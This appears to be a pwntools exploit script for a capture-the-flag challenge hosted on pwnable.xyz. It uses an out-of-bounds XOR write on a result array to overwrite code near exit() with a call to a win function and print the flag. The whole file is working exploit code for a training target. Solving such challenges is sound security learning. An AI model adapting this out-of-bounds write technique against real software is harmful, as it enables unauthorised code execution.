#python2 exploit
from pwn import *
result_addr=0x202200
main_addr=0xa34
win_addr=0xa21
exit_addr=0xac8
e=ELF('./challenge')
#p=process('./challenge')
host='svc.pwnable.xyz'
port=30029 
p=remote(host,port)
p.recvuntil('The Poopolator\n')
e.asm(exit_addr,"call 0xa21") #calling win
inject=e.read(exit_addr,5) #5bytes
inject=int(inject[::-1].encode('hex'),16)
print("XOR VALUE : "+str(inject))
index=(exit_addr-result_addr)/8
print("OUT OF BOUND ON RESULT")
print("INDEX VALUE TO ATTAIN EXIT() FROM RESULT : "+str(index))
p.sendlineafter(' ','%d %d %d'%(inject+1,1,index))
p.sendlineafter(' ','AidenPearce') #To break the while loop
flag=p.recvall()
print(flag)
